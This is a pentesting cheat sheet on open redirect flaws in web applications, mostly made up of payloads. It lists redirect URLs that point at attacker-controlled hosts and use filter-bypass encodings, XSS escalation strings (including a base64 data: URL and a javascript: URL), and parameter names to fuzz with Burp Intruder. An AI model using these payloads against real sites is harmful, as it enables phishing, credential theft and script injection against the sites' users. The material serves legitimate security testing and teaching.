# Open Redirect

Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.

***

## Summary
- [30X HTTP Status](#)
- [Detection](#detection)
- [Open Redirect to XSS](#open-redirect-to-xss)
- [Vulnerable Params](#vulnerable-params)

***

## 30X HTTP Status

- [300 Multiple Choices](https://httpstatuses.com/300)
- [301 Moved Permanently](https://httpstatuses.com/301)
- [302 Found](https://httpstatuses.com/302)
- [303 See Other](https://httpstatuses.com/303)
- [304 Not Modified](https://httpstatuses.com/304)
- [305 Use Proxy](https://httpstatuses.com/305)
- [307 Temporary Redirect](https://httpstatuses.com/307)
- [308 Permanent Redirect](https://httpstatuses.com/308)

***

## Detection

```
https://vulnerable.com/signup?redirectUrl=https://attacker.com/account
```
```
http://vulnerable.com//bing.com
```
```
http://vulnerable.com//www.bing.com
```
```
http://vulnerable.com//bing.com/%2e%2e
```
```
http://vulnerable.com/auth/login?redirect=/%5Cbing.com
```
```
https://www.vulnerable.com.attacker.com/
www.vulnerable.com.attacker.com/
```
```
https:bing.com
```
```
https://vulnerable.com\/\/google.com/
https://vulnerable.com/\/google.com/
```
```
https://vulnerable.com/?redirectUrl=\/\/google.com/
https://vulnerable.com/?redirectUrl=\/google.com/
```
```
https://vulnerable.com/?redirect=google。com
```
```
https://vulnerable.com//google%E3%80%82com
```
```
https://vulnerable.com//google%00.com
```
```
https://vulnerable.com/?next=whitelisted.com&next=google.com
```
```
http://www.vulnerable.com@bing.com/
```
```
http://www.vulnerable.com?http://www.bing.com/
http://www.vulnerable.com?folder/www.bing.com
```
```
https://attacker.c℀.vulnerable.com . ---> https://attacker.ca/c.vulnerable.com
```

***

## Open Redirect to XSS

### If it's in a JS variable:

```
";alert(0);//
```

### From `data://` wrapper:

```
http://www.vulnerable.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

### From `javascript://` wrapper:

```
http://www.vulnerable.com/redirect.php?url=javascript:prompt(1)
```

***

## Vulnerable Params

Replace `replaceme.com` from *openRedirectPayloads.txt* with a specific white listed domain in your test case.
```
sed 's/replaceme.com/[yourVictimOrDomain].com/' openRedirectPayloads.txt > [vulnerable].txt
```

Mirar las peticiones 3XX en BurpSuite:

```
/{payload}
?next={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```

Add `http://example.com/{payloads}` or `http://example.com/?paramPotentialVuln={payloads}` and with `Intruder` + `payloads.txt` test the OpenRedirection.









